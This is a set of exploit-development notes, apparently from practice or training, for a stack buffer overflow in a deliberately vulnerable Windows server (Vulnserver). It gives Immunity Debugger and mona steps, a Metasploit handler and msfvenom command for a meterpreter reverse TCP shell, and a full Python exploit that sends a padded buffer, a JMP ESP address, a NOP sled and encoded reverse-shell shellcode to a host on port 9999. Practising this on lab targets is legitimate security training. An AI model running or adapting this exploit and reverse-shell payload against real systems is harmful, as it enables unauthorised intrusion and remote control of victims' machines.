## Static

## Behavroal 
  - Get-Process | findstr /i vuln
  - netstat -anop tcp |

## Dynamic
  - Run Immunity as Administrator > Open .exe > play, rewind, repeat
  - Fuzzing > Wiremask > find offset
  
  - !mona modules    # Find unprotected DLL's
  - !mona jmp -r esp -m "essfunc.dll"   # Search for JMP ESP with unprotected DLL
  # Window > Log Data | Shows us what we are looking for in the cmd above

  # MSF Console
  - msfconsole
  - use multi/handler
  - show options
  - set payload windows/meterpreter/reverse_tcp
  - set LHOST 0.0.0.0
  - set LPORT 4444
  - exploit

  # SHELL Code
  - msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.x.x lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python

  #Execution
    # Ensure MSFConsole is running > Rewind and play server in Immunity




----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
#!/usr/bin/python
import socket

buf = "TRUN /.:/"
buf += "A"  * 2003
#buf += "c1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5D$
buf += "\xaf\x11\x50\x62"
buf += "\x90" * 10

# Shell Code
buf += b"\xb8\xd3\xf3\xea\xd6\xdb\xd2\xd9\x74\x24\xf4\x5f"
buf += b"\x33\xc9\xb1\x59\x31\x47\x14\x83\xef\xfc\x03\x47"
buf += b"\x10\x31\x06\x16\x3e\x3a\xe9\xe7\xbf\x24\x63\x02"
buf += b"\x8e\x76\x17\x46\xa3\x46\x53\x0a\x48\x2d\x31\xbf"
buf += b"\x5f\x86\xfc\x99\x6e\x17\x8b\x94\xb8\xd6\x4c\xf4"
buf += b"\x85\x79\x31\x07\xda\x59\x08\xc8\x2f\x98\x4d\x9e"
buf += b"\x5a\x75\x03\xaa\xf7\x99\x2f\xee\xcb\xce\x2e\x3f"
buf += b"\xb8\xb0\x48\x3a\x7f\x44\xe5\x45\x50\x2f\xad\x65"
buf += b"\xdb\x67\x56\x36\xda\xa4\xe3\x7f\xa8\x76\xdd\x80"
buf += b"\x18\x0d\x29\xf4\x9a\xc7\x63\xca\x5c\x28\x8e\x66"
buf += b"\x5f\x71\xa9\x96\x15\x89\xc9\x2b\x2e\x4a\xb3\xf7"
buf += b"\xbb\x4c\x13\x73\x1b\xa8\xa5\x50\xfa\x3b\xa9\x1d"
buf += b"\x88\x63\xae\xa0\x5d\x18\xca\x29\x60\xce\x5a\x69"
buf += b"\x47\xca\x07\x29\xe6\x4b\xe2\x9c\x17\x8b\x4a\x40"
buf += b"\xb2\xc0\x79\x97\xc2\x29\x82\x98\x9e\xbd\x4e\x55"
buf += b"\x21\x3d\xd9\xee\x52\x0f\x46\x45\xfd\x23\x0f\x43"
buf += b"\xfa\x32\x07\x74\xd4\xfc\x48\x8a\xd5\xfc\x41\x49"
buf += b"\x81\xac\xf9\x78\xaa\x27\xfa\x85\x7f\xdd\xf0\x11"
buf += b"\x8a\x13\xb4\x6d\xe2\x51\xb6\x60\xaf\xdc\x50\xd2"
buf += b"\x1f\x8e\xcc\x93\xcf\x6e\xbd\x7b\x1a\x61\xe2\x9c"
buf += b"\x25\xa8\x8b\x37\xca\x04\xe3\xaf\x73\x0d\x7f\x51"
buf += b"\x7b\x98\x05\x51\xf7\x28\xf9\x1c\xf0\x59\xe9\x49"
buf += b"\x67\xa1\xf1\x89\x02\xa1\x9b\x8d\x84\xf6\x33\x8c"
buf += b"\xf1\x30\x9c\x6f\xd4\x43\xdb\x90\xa9\x75\x97\xa7"
buf += b"\x3f\x39\xcf\xc7\xaf\xb9\x0f\x9e\xa5\xb9\x67\x46"
buf += b"\x9e\xea\x92\x89\x0b\x9f\x0e\x1c\xb4\xc9\xe3\xb7"
buf += b"\xdc\xf7\xda\xf0\x42\x08\x09\x83\x85\xf6\xcf\xac"
buf += b"\x2d\x9e\x2f\xed\xcd\x5e\x5a\xed\x9d\x36\x91\xc2"
buf += b"\x12\xf6\x5a\xc9\x7a\x9e\xd1\x9c\xc9\x3f\xe5\xb4"
buf += b"\x8c\xe1\xe6\x3b\x15\x12\x9c\x34\xaa\xd3\x61\x5d"
buf += b"\xcf\xd4\x61\x61\xf1\xe9\xb7\x58\x87\x2c\x04\xdf"
buf += b"\x98\x1b\x29\x76\x33\x63\x7d\x88\x16"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.177.146", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()


"""
0x625011af      ->      \xaf\x11\x50\x62 
0x625011bb      ->      \xbb\x11\x50\x62 
0x625011c7      ->      \xc7\x11\x50\x62 
0x625011d3      ->      \xd3\x11\x50\x62 
"""

----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------

